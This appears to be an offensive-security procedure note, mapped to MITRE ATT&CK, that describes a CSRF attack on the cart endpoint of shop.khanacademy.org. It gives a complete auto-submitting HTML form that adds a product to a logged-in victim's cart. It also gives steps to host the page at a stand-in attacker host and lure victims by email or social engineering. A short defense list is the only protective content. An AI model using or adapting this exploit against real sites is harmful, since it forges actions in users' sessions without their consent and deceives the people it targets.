---
id: proc-6378-submit-csrf-poc
tags:
  - csrf
  - exploit
  - web
  - poc
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:15.784Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Submit-CSRF-POC-to-Add-Cart-Item

## Summary

This procedure crafts and delivers a proof-of-concept HTML form that auto-submits a forged POST request to the Khan Academy shop cart endpoint, adding an item without user consent by exploiting missing CSRF token validation.

## Description

The vulnerability stems from the /cart update functionality accepting POST requests with parameters like updates[PRODUCTID]=quantity without requiring a CSRF token. An attacker hosts a malicious HTML page that, upon loading, submits the form using the victim's browser session, leading to unauthorized cart changes. This targets authenticated users tricked into visiting the attacker's site.

## Requirements

1. Control of a web server to host the HTML PoC
2. Victim's browser must be authenticated to shop.khanacademy.org
3. Knowledge of product IDs (e.g., 211669705)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing forms
- Enforce same-origin policy strictly
- Log and alert on anomalous cart updates from external referers

## Objectives

1. Forge a cart update request via victim's session
2. Add a specific item (e.g., product 211669705) to the cart
3. Demonstrate lack of CSRF protection

## Instructions

### Step 1: Craft the PoC HTML

**Context**: Create an HTML form that targets the vulnerable endpoint with the desired update.

Write the following HTML file:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf-poc" action="http://shop.khanacademy.org/cart" method="post">
  <input type="hidden" name="updates[211669705]" value="1">
  <input type="hidden" name="update" value="Update quantities">
</form>
<script>
  document.getElementById('csrf-poc').submit();
</script>
</body>
</html>
```

> This form auto-submits on load, sending the POST with hidden fields.

### Step 2: Host and Lure Victim

**Context**: Serve the PoC and trick the victim into loading it.

Upload the HTML to a web server (e.g., GitHub Pages or local server) and send a link via email or social engineering.

```html
<!-- Host at: http://attacker.com/csrf-poc.html -->
<!-- Victim visits, form submits silently -->
```

> Expected output: Browser makes POST to /cart; no visible change on attacker's page.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[exploit]]
- [[web]]
- [[poc]]
